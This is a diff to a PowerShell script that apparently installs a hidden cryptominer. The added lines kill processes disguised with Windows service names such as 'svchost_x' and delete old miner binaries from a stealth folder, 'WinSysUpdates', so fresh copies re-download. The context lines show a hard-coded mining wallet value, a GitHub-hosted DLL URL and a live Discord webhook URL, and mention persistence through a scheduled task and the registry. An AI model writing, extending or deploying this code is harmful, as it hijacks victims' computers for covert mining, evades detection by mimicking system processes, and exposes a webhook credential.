@@ -5,6 +5,19 @@ $DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.d
 $Wallet = "1871092382" # Mining Key
 $Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"
 
+# --- CLEANUP OLD INSTANCE (kill old processes + delete old binaries for fresh update) ---
+$StealthDir = "$env:USERPROFILE\AppData\Local\WinSysUpdates"
+$killNames = @("svchost_x", "RuntimeBroker_x", "SecurityHealthService_x", "SearchIndexer_x", "spoolsv_x", "ctfmon_x", "WinSysHelper")
+foreach ($k in $killNames) {
+    try { Stop-Process -Name $k -Force -ErrorAction SilentlyContinue } catch { }
+}
+# Delete old miner binaries so they re-download fresh
+if (Test-Path $StealthDir) {
+    Get-ChildItem $StealthDir -Filter "*_x.exe" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem $StealthDir -Filter "*_g.exe" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+}
+Start-Sleep -Milliseconds 500
+
 # --- SINGLE-INSTANCE MUTEX (prevent double-runs from scheduled task + registry) ---
 $MutexName = "Global\WinSysUpdatesMtx_7f3a"
 $script:Mutex = $null
